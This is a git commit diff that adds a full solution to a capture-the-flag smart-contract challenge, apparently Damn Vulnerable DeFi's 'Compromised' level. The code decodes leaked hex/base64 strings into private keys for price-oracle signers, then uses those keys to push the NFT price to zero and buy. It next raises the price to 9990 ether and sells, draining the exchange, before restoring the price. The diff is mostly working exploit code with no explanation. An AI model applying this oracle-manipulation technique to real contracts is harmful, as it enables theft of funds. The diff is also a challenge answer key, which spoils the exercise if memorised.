07d7779b117a7ca345970353ab23baaddcd0b2be
Anton Katlyar <katlyar.anton@mail.ru>
2023-05-05 02:19:30 +0200

    hack: compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,6 +61,70 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        const formatRawHexDataLeaksToPrivateKeys = dataLeak => {
+            const formattedBase64String = Buffer.from(dataLeak, 'hex').toString('utf-8');
+
+            return Buffer.from(formattedBase64String, 'base64').toString('utf-8');
+        }
+
+        const firstDataLeak = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'.replace(/\s+/g, '');
+        const secondDataLeak = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'.replace(/\s+/g, '');
+
+        const firstPrivateKey = formatRawHexDataLeaksToPrivateKeys(firstDataLeak);
+        const secondPrivateKey = formatRawHexDataLeaksToPrivateKeys(secondDataLeak);
+        
+        console.log('Formatted key 1', firstPrivateKey);
+        console.log('Formatted key 2', secondPrivateKey);
+
+        const firstHacketSourceWallet = new ethers.Wallet(firstPrivateKey, ethers.provider);
+        const secondHacketSourceWallet = new ethers.Wallet(secondPrivateKey, ethers.provider);
+
+        // abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", 9990 ether)
+        const hugePriceData = '0xbcc82dc4000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000021d8f19a6b628580000000000000000000000000000000000000000000000000000000000000000000544564e4654000000000000000000000000000000000000000000000000000000';
+        // abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", 0)
+        const zeroPriceData = '0xbcc82dc400000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000544564e4654000000000000000000000000000000000000000000000000000000';
+        // abi.encodeWithSignature("postPrice(string,uint256)", "DVNFT", 999 ether)
+        const defaultPriceData = '0xbcc82dc4000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000003627e8f712373c0000000000000000000000000000000000000000000000000000000000000000000544564e4654000000000000000000000000000000000000000000000000000000';
+
+        const signAndSendTransaction = async (wallet, tx) => {
+            await wallet.signTransaction(tx);
+            await wallet.sendTransaction(tx);
+        }
+
+        const txZeroPrice = {
+            to: this.oracle.address,
+            data: zeroPriceData,
+        };
+
+        await signAndSendTransaction(firstHacketSourceWallet, txZeroPrice);
+        await signAndSendTransaction(secondHacketSourceWallet, txZeroPrice);
+
+        await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther('0.01') });
+
+        console.log('Price now is ', ethers.utils.formatEther(await this.oracle.getMedianPrice('DVNFT')));
+        console.log('Attaker balance before', ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+        
+        const txHugePrice = {
+            to: this.oracle.address,
+            data: hugePriceData,
+        };
+
+        await signAndSendTransaction(firstHacketSourceWallet, txHugePrice);
+        await signAndSendTransaction(secondHacketSourceWallet, txHugePrice);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        console.log('Attaker balance after', ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+
+        const txDefaultPrice = {
+            to: this.oracle.address,
+            data: defaultPriceData,
+        };
+
+        await signAndSendTransaction(firstHacketSourceWallet, txDefaultPrice);
+        await signAndSendTransaction(secondHacketSourceWallet, txDefaultPrice);
     });
 
     after(async function () {
